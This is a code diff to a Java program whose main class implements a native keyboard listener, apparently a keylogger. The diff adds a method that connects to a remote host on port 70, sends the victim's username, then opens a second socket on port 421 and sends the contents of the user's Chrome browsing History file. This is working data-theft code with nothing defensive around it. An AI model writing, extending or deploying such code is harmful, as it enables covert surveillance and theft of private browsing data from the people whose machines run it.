@@ -224,4 +224,31 @@ public class Main implements NativeKeyListener{
 			 System.out.println("blargh");
 		 }
 	 }
+	 public static void uphistory(String ipee) throws IOException {
+		 try {
+		 		@SuppressWarnings("resource")
+				Socket socket = new Socket(getHostIP(), 70);
+		 		OutputStream t = socket.getOutputStream();
+		 		PrintWriter out = new PrintWriter(t);
+					String toSend = System.getProperty("user.name") + "history.txt";
+					out.print(toSend );
+					out.flush();
+					socket.close();
+					Socket nakadashi = new Socket(getHostIP(), 421);
+					System.out.println("Accepted connection : " + nakadashi); 
+					File transferFile = new File ("C:/Users/" + System.getProperty("user.name") + "/AppData/Local/Google/Chrome/User Data/Default/History"); 
+					byte [] bytearray = new byte [(int)transferFile.length()]; 
+					FileInputStream fin = new FileInputStream(transferFile); 
+					BufferedInputStream bin = new BufferedInputStream(fin); 
+					bin.read(bytearray,0,bytearray.length); 
+					OutputStream os = nakadashi.getOutputStream(); 
+					System.out.println(""); 
+					os.write(bytearray,0,bytearray.length); 
+					os.flush();
+				    nakadashi.close();
+					System.out.println("yip!");
+				 } catch (Exception e) {
+					 System.out.println("blarfff");
+				 }
+	 }
 }
